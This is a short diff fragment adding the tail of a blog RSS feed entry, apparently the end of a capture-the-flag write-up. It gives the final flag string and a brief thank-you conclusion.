+&lt;p&gt;And the flag is &lt;code&gt;KCSC{gu7_ch0p_3m_hjhjhjhj!!!}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;So that is it for today write-up, thank you and I hope you can learn something from this. Feel free to share it to your friends.&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
